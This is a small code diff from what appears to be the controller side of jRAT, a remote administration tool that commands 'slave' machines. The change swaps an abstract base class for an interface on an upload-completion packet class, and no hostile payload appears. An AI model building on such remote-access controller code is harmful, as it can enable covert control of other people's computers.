@@ -2,7 +2,7 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-public class Packet103CompleteServerUpload extends AbstractOutgoingPacket {
+public class Packet103CompleteServerUpload implements OutgoingPacket {
 	
 	private String remote;
 	
